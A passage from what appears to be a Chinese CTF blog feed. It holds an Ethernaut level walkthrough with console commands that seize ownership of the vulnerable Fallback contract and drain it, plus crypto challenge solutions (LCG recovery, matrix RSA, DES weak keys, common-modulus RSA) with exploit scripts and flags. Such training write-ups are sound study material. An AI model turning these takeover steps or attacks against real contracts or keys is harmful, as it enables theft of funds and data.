class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563261</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563297</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563391</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563511</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563711</span>]</span><br><span class="line">p = res[<span class="number">11</span>]</span><br><span class="line">pp = mul(res)</span><br><span class="line">K = GF(p)</span><br><span class="line">E = EllipticCurve(K, (<span class="number">0</span>, <span class="number">4</span>))</span><br><span class="line">qwq = <span class="number">0x320238b</span></span><br><span class="line">order = E.order()</span><br><span class="line">qwq_sq = qwq ** <span class="number">2</span></span><br><span class="line">qaq = order // qwq_sq</span><br><span class="line">outputs=[<span class="number">2258729984869869545899085887518820011795880892632317458813070773270633871398785757696896679887453336507722151037267</span>, <span class="number">1843407310728065127389586068976768146728145160643439144895915852634291722663455873979176336542780552480617232750208</span>, <span class="number">1107061034832953338095294459542523703297843192927313275050958753437078121375795698115353665062727895555487155331316</span>, <span class="number">460337686287218470707660572908024613140030922587867288532588857547792028112129697850035268228038619747643899804437</span>, <span class="number">1659483062154723617504533638726171721668768657049197025961515070605996080663312140357834824850074607457421362000265</span>, <span class="number">3150528329201636320206556304125544975332446992414777732425647667048147102509308959254762895094589762017857965981432</span>, <span class="number">3338854035461286314545186888372727000962778038359519702308782495912356677650264814573463929190025956045491115654437</span>, <span class="number">3042574495339632074308497406446851120362994432361876743901608172567070991832258762751304397604780567703759317642849</span>, <span class="number">380771388315580393673388198522357440257018642337119013880143084485482127962577943753495690258532782147018511750175</span>, <span class="number">507222017133457507399048159541059729302482262298099528096040456818913085187752925782279385808732260473494863290057</span>, <span class="number">533663958640518878580794848474449572155795564171089765377581587253792204491009275840408579120376539757958097910250</span>, <span class="number">2681145160205204287930367627648683111546318004811732016137828270063753300095675791698398080219566725174890793619305</span>, <span class="number">3259478178021541801713314504097142165241891541242669456591074651894459393333167453811425864198267757724232689747676</span>, <span class="number">3553147298452254907907643059383506744982654808021508866104139240155822133286673657139615950259800036058045049186173</span>, <span class="number">1778776925369812510137824472396145391840300438509021838870105004154301861222612045533034046889878767915343446874895</span>, <span class="number">3409071358092535255033136229525415652816479844958949032220987821989305575696869929136493897719813036034016228268240</span>, <span class="number">571819148781137687997336847709735468532344087614483867682513640750800758034003212746545051127998686475933050072942</span>, <span class="number">2676666310158795770609746651024766841212271213339384335651155407291004834251914242990757216402110096603729617413168</span>, <span class="number">2557670339976470006330058052583841683167706755578266425502679937976714609864257535859316483527764340425703004883241</span>, <span class="number">973319024062640263364951783086923560907216776835485042157036675663719529568519121997200478026304141184810597275543</span>, <span class="number">1189768012357955450386827626693191057999220508190415783719135619271537446794904663649700073564180453068646130539863</span>, <span class="number">790522915783756530835443034667719516913120763875831140857606265058871034793645280121113275798239222760522467771184</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(gcd(qaq*qwq,p-<span class="number">1</span>))<span class="comment">#15132376222941642753</span></span><br><span class="line"><span class="built_in">print</span>(gcd(qaq*qwq//<span class="number">15132376222941642753</span>,p-<span class="number">1</span>))<span class="comment">#96192362849</span></span><br><span class="line">d=invert(qaq*qwq//(<span class="number">15132376222941642753</span>*<span class="number">96192362849</span>),p-<span class="number">1</span>)</span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> output <span class="keyword">in</span> outputs:</span><br><span class="line">    result = <span class="built_in">pow</span>(<span class="built_in">pow</span>(output, qwq, p), d, p)</span><br><span class="line">    m.append(result)</span><br><span class="line">gcd=<span class="number">15132376222941642753</span>*<span class="number">96192362849</span></span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(printable):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">        k = (i+j).encode()</span><br><span class="line">        dic[<span class="built_in">int</span>(<span class="built_in">pow</span>(bytes_to_long(k), gcd, p))] = k</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(dic[<span class="built_in">int</span>(t)].decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;530830fe-3b65-416a-8488-b9b8c06ba66d&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="ECBag"><a href="#ECBag" class="headerlink" title="ECBag"></a>ECBag</h1><p>等着有wp了复现吧</p>
]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethernaut靶场刷题记录</title>
    <url>/2025/04/01/Ethernaut%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>持续更新ing</p>
<span id="more"></span>

<h1 id="1，Hello-Ethernaut"><a href="#1，Hello-Ethernaut" class="headerlink" title="1，Hello Ethernaut"></a>1，Hello Ethernaut</h1><p>跟着提示输入就行，这一节只是简单教你如何在Ethernaut网站使用控制台和合约进行交互，包括查看合约详情信息、调用合约内方法等。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract.<span class="title function_">info</span>()</span><br><span class="line"><span class="comment">// &quot;You will find what you need in info1().&quot;</span></span><br><span class="line">contract.<span class="title function_">info1</span>()</span><br><span class="line"><span class="comment">// &quot;Try info2(), but with &quot;hello&quot; as a parameter.&quot;</span></span><br><span class="line">contract.<span class="title function_">info2</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;The property infoNum holds the number of the next info method to call.&quot;</span></span><br><span class="line">contract.<span class="title function_">infoNum</span>()</span><br><span class="line"><span class="comment">// 42</span></span><br><span class="line">contract.<span class="title function_">info42</span>()</span><br><span class="line"><span class="comment">// &quot;theMethodName is the name of the next method.&quot;</span></span><br><span class="line">contract.<span class="title function_">theMethodName</span>()</span><br><span class="line"><span class="comment">// &quot;The method name is method7123949.&quot;</span></span><br><span class="line">contract.<span class="title function_">method7123949</span>()</span><br><span class="line"><span class="comment">// &quot;If you know the password, submit it to authenticate().&quot;</span></span><br><span class="line">contract.<span class="title function_">password</span>()</span><br><span class="line"><span class="comment">// &quot;ethernaut0&quot;</span></span><br><span class="line">contract.<span class="title function_">authenticate</span>(<span class="string">&#x27;ethernaut0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="2，Fallback"><a href="#2，Fallback" class="headerlink" title="2，Fallback"></a>2，Fallback</h1><p>先来看给出的合约代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(address =&gt; uint) <span class="keyword">public</span> contributions;</span><br><span class="line">  address payable <span class="keyword">public</span> owner;</span><br><span class="line"></span><br><span class="line">  constructor() <span class="keyword">public</span> &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">contribute</span><span class="params">()</span> <span class="keyword">public</span> payable &#123;</span><br><span class="line">    require(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">getContribution</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title function_">returns</span> <span class="params">(uint)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">withdraw</span><span class="params">()</span> <span class="keyword">public</span> onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(<span class="built_in">this</span>).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目是fallback，那么啥是fallback呢，就是当其他合约调用该合约切该合约不存在相应函数就会触发fallback，fallback功能由合约所有者自定义。</p>
<p>简单分析合约：</p>
<p>令合约创建者为owner，其贡献值为1000eth；</p>
<p>contribute方法要求发送的ether不超过0.001eth，然后记录发送者贡献；</p>
<p>onlyOwner修改器要求交易发送者必须为owner；</p>
<p>withdraw方法由onlyOwner修改器控制，内容为取走合约内所有ether；</p>
<p>最下面的receive是如果交易发送者贡献大于0且向合约发送的eth大于0，则owner易主，变为交易发送者</p>
<p>这里涉及到更改owner的地方只有2处，首先是contribute函数，可以观察到他的条件很难触发，要我们的eth大于合约所有者的eth，但是合约所有者的eth在最开始就有1000，所以这是很难做到的。</p>
<p>再来看下面这个receive函数，有人向合约发送一些以太坊而没有在交易的 “数据”字段中指定任何东西时，receive 就会被 自动调用。那么receive就是接收到外部转账的时候会调用这个方法并执行里面的内容。那么思路已经很清晰了。首先调用contribute函数传一个小于0.001eth，这样发送者就会存在贡献，然后从外部向合约发送eth触发receive函数，使我们自己变为owner，在withdraw提取所有eth即可。这里提供两种解题方法。</p>
<h2 id="1-f12直接交互"><a href="#1-f12直接交互" class="headerlink" title="1,f12直接交互"></a>1,f12直接交互</h2><p>交互代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&#x27;0.0009&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>)&#125;)</span><br><span class="line">contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&#x27;0.00001&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>)&#125;)</span><br><span class="line">contract.<span class="title function_">withdraw</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就像上面讲的那样。第一步首先用小于0.001eth向合约捐献，调用contribute()函数，使我们拥有贡献值，然后从外部直接向合约发送1wei，触发recvie函数，即可成为owner。最后调用withdraw即可</p>
<h2 id="2-solidity代码交互"><a href="#2-solidity代码交互" class="headerlink" title="2,solidity代码交互"></a>2,solidity代码交互</h2><p>刚开始学solidity，刚好多用用熟悉一下。</p>
<p>首先把代码全复制粘贴到remix.ide里，AT address</p>
]]></content>
      <tags>
        <tag>blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>Dragon Knight CTF官方wp</title>
    <url>/2024/07/25/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/</url>
    <content><![CDATA[<p>wwwww</p>
<h1 id="题目复现网站"><a href="#题目复现网站" class="headerlink" title="题目复现网站"></a>题目复现网站</h1><p><a href="https://www.qsnctf.com/#/main/driving-range">https://www.qsnctf.com/#/main/driving-range</a></p>
<span id="more"></span>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a><strong>签到</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">output = [<span class="number">5944442525761903973219225838876172353829065175803203250803344015146870499</span>,</span><br><span class="line">          <span class="number">141002272698398325287408425994092371191022957387708398440724215884974524650</span>,</span><br><span class="line">          <span class="number">42216026849704835847606250691811468183437263898865832489347515649912153042</span>,</span><br><span class="line">          <span class="number">67696624031762373831757634064133996220332196053248058707361437259689848885</span>,</span><br><span class="line">          <span class="number">19724224939085795542564952999993739673429585489399516522926780014664745253</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(output)):</span><br><span class="line">    t.append(output[i] - output[i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">T = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t) - <span class="number">1</span>):</span><br><span class="line">    T.append(t[i + <span class="number">1</span>] * t[i - <span class="number">1</span>] - t[i] ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(T) - <span class="number">1</span>):</span><br><span class="line">    mm = gmpy2.gcd(T[i], T[i + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> isPrime(mm):</span><br><span class="line">        m.append(<span class="built_in">int</span>(mm))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">            <span class="keyword">if</span> isPrime(mm // i):</span><br><span class="line">                mm = mm // i</span><br><span class="line">                m.append(<span class="built_in">int</span>(mm))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    a = gmpy2.invert(t[<span class="number">0</span>], i) * t[<span class="number">1</span>] % i</span><br><span class="line">    b = output[<span class="number">1</span>] - a * output[<span class="number">0</span>] % i</span><br><span class="line">    a_ = gmpy2.invert(a, i)</span><br><span class="line"></span><br><span class="line">    seed = a_ * (output[<span class="number">0</span>] - b) % i</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">        seed = a_ * (seed - b) % i</span><br><span class="line">        flag = long_to_bytes(seed)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Matrix-revenge"><a href="#Matrix-revenge" class="headerlink" title="Matrix_revenge"></a><strong>Matrix_revenge</strong></h3><p>出这个revenge版主要是希望师傅们学到一般线性群的阶<br>4阶模p矩阵的阶为<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406273-9536b7c5-8b55-4019-9978-d00499a33b71.svg" alt="image.png"><br>然后就是和RSA一样的思路<br>求一个d，满足<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406274-de4f17a8-f412-49f6-a249-f548b2c6bb8b.svg" alt="image.png"><br><a href="https://exp.py/">exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">724011645798721468405549293573288113</span>   </span><br><span class="line">q = <span class="number">712853480230590736297703668944546433</span></span><br><span class="line">C = [(<span class="number">354904294318305224658454053059339790915904962123902870614765704810196137</span>, <span class="number">307912599668649689143528844269686459695648563337814923172488152872006235</span>, <span class="number">143644686443811064172873392982322248654471792394264352463341325181752577</span>, <span class="number">22995887787365556743279529792687264972121816670422146768160153217903088</span>), (<span class="number">111349308911096779758451570594323566987628804920420784718347230085486245</span>, <span class="number">370237591900013263581099395076767089468466012835217658851568690263421449</span>, <span class="number">305451886364184428434479088589515273362629589399867618474106045683764897</span>, <span class="number">454103583344277343974714791669312753685583930212748198341578178464249150</span>), (<span class="number">168497521640129742759262423369385500102664740971338844248603058993335309</span>, <span class="number">228941893018899960301839898935872289351667488000643221589230804176281482</span>, <span class="number">340080333594340128998141220817079770261711483018587969623825086357581002</span>, <span class="number">122922413789905368029659916865893297311475500951645918611759627764993518</span>), (<span class="number">10332477229415731242316540110058798318207430965033579181240340751539101</span>, <span class="number">238172263316130590821973648893483382211906906298557131324791759298887701</span>, <span class="number">487586702165464601760230182019344052665496627253691596871783460314632260</span>, <span class="number">12238020921585443139790088280608644406695242899000592355653073240122626</span>)]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">phip = (p-<span class="number">1</span>)*(p+<span class="number">1</span>)*(p^<span class="number">2</span>+p+<span class="number">1</span>)*p*(p^<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">phiq = (q-<span class="number">1</span>)*(q+<span class="number">1</span>)*(q^<span class="number">2</span>+q+<span class="number">1</span>)*q*(q^<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phip*phiq)</span><br><span class="line"></span><br><span class="line">C = Matrix(Zmod(n),C)</span><br><span class="line"></span><br><span class="line">M = C ** d</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        m = <span class="built_in">int</span>(M[i,j])</span><br><span class="line">        flag += long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># DRKCTF&#123;a58986e7-33e5-4f65-8c22-b8a5e620752d&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="EzDES"><a href="#EzDES" class="headerlink" title="EzDES"></a><strong>EzDES</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc = des.encrypt(pad(flag,<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;t\xe4f\x19\xc6\xef\xaaL\xc3R&#125;\x08;K\xc9\x88\xa6|\nF\xc3\x12h\xcd\xd3x\xc3(\x91\x08\x841\xca\x8b\xc1\x94\xb5\x9f[\xcd\xc6\x9f\xf9\xf6\xca\xf5\x1a\xda\x16\xcf\x89\x154\xa1\xfe\xc5\x16\xcf\x89\x154\xa1\xfe\xc5&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>根据题目描述，从密钥入手，这道题主要想让师傅们了解到DES的弱密钥。<br>网上随便找个弱密钥就可以解了<br>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;0101010101010101&quot;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;t\xe4f\x19\xc6\xef\xaaL\xc3R&#125;\x08;K\xc9\x88\xa6|\nF\xc3\x12h\xcd\xd3x\xc3(\x91\x08\x841\xca\x8b\xc1\x94\xb5\x9f[\xcd\xc6\x9f\xf9\xf6\xca\xf5\x1a\xda\x16\xcf\x89\x154\xa1\xfe\xc5\x16\xcf\x89\x154\xa1\xfe\xc5&#x27;</span></span><br><span class="line">flag = des.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># DRKCTF&#123;We4k_K3y_1s_V3ry_D4nger0us_In_DES&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="MidRSA"><a href="#MidRSA" class="headerlink" title="MidRSA"></a><strong>MidRSA</strong></h3><h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a><strong>part1</strong></h4><p>由题意知<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406255-f65f2b4b-281a-449c-ac59-c66b16f25af5.svg" alt="image.png"><br>我们取两个不同的i,j<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406399-5b3ea739-e448-4211-bfe2-b5523fad77d9.svg" alt="image.png"><br>于是有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406403-87ad26c6-0884-45f6-8722-942d9abba452.svg" alt="image.png"><br>取两组这样的值，然后求公因数即可得到n<br>得到n之后右移300位即可得到前半部分的flag</p>
<h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a><strong>part2</strong></h4><p>利用共模攻击的思路，设存在x,y，使得下式成立<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406470-abe52da0-c2f3-4db8-abdf-e36e768c4f6c.svg" alt="image.png"><br>我们便有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406471-21b52f9d-749e-48de-8ae1-ac3c3cc75fb0.svg" alt="image.png"><br>这里gcd(e1,e2) !&#x3D; 1<br>我们需要再进行一次共模攻击<br>假设存在s,t，使得下式成立<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406498-0d7109f8-c3e5-45c3-8af9-4c98253c6c88.svg" alt="image.png"><br>即<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406635-0c9fbe2f-f353-4cbc-b1a7-f4bb9f360879.svg" alt="image.png"><br>则有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406646-6c8af5ee-e86d-449c-bc55-69d319fe348b.svg" alt="image.png"><br><a href="https://exp.py/">exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>(<span class="params">c,e</span>):</span><br><span class="line">    knlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">            <span class="keyword">if</span> i!=j:</span><br><span class="line">                knlist.append(c[i]**e[j] - c[j]**e[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(knlist)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(knlist)):</span><br><span class="line">            <span class="keyword">if</span> i!=j:</span><br><span class="line">                kn = gmpy2.gcd(knlist[i],knlist[j])</span><br><span class="line">                <span class="keyword">if</span> kn != <span class="number">1</span>:</span><br><span class="line">                    n = kn</span><br><span class="line">                    flag1 = long_to_bytes(n &gt;&gt; <span class="number">300</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&quot;DRKCTF&quot;</span> <span class="keyword">in</span> flag1:</span><br><span class="line">                        <span class="keyword">return</span> flag1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt2</span>(<span class="params">c,e,n</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">e1,e2,c1,c2</span>):</span><br><span class="line">        s,x,y = gmpy2.gcdext(e1,e2)</span><br><span class="line">        res = <span class="built_in">pow</span>(c1,x,n) * <span class="built_in">pow</span>(c2,y,n) % n</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    res1 = decode(e[<span class="number">0</span>],e[<span class="number">1</span>],c[<span class="number">0</span>],c[<span class="number">1</span>])</span><br><span class="line">    res2 = decode(e[<span class="number">2</span>],gmpy2.gcd(e[<span class="number">0</span>],e[<span class="number">1</span>]),c[<span class="number">2</span>],res1)</span><br><span class="line">    flag2 = long_to_bytes(res2)</span><br><span class="line">    <span class="keyword">return</span> flag2</span><br><span class="line"></span><br><span class="line">e1 = [<span class="number">109</span>, <span class="number">71</span>, <span class="number">109</span>, <span class="number">73</span>]</span><br><span class="line">cipher1 = [<span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080</span>, <span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871</span>]</span><br><span class="line">e2 = [<span class="number">79572758141493570128961125255246129069540961757778793209698370333142346488381</span>, <span class="number">80555585862127636800866563977080055603517001358195529410497461746213789997225</span>, <span class="number">44651921320695090688745333790065512192118202496468714141526113242887125432380</span>]</span><br><span class="line">cipher2 = [<span class="number">58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057</span>, <span class="number">16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337</span>, <span class="number">80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546</span>]</span><br><span class="line">n = <span class="number">93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line">flag1 = decrypt1(cipher1,e1)</span><br><span class="line">flag2 = decrypt2(cipher2,e2,n)</span><br><span class="line">flag = flag1 + flag2</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># DRKCTF&#123;5d0b96e8-e069-4378-82e7-120e4b761a0b&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Myencrypt"><a href="#Myencrypt" class="headerlink" title="Myencrypt"></a><strong>Myencrypt</strong></h3><h4 id="求解P"><a href="#求解P" class="headerlink" title="求解P"></a><strong>求解P</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def getMyPrime():              </span><br><span class="line">    while True:              </span><br><span class="line">        r = random.getrandbits(64)              </span><br><span class="line">        _p = r**6 -3*r**5 - r**4 + r**2 - r - 6</span><br><span class="line">        _q = r**7 + 2*r**6 + r**5 + 4*r**4 + 7*r**2 + r + 4653</span><br><span class="line">        if isPrime(_p) and isPrime(_q):              </span><br><span class="line">            return _p, _q</span><br></pre></td></tr></table></figure>

<p>由题目可知，根据p,q的特殊性，我们可以把n写成关于r的式子，即<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406737-a63247ac-3d4f-49a7-ad9a-7b21861645d0.svg" alt="image.png"><br>我们直接对n开13次方，得到的值记为temp，这个temp与实际上的r相差不大(这一点可以自己生成数据进行验证)。<br>在得到tmp之后，我们采取爆破的方式求解r，有了r就很容易求出p,q，然后再进行RSA求解得到LCG的模，也就是P</p>
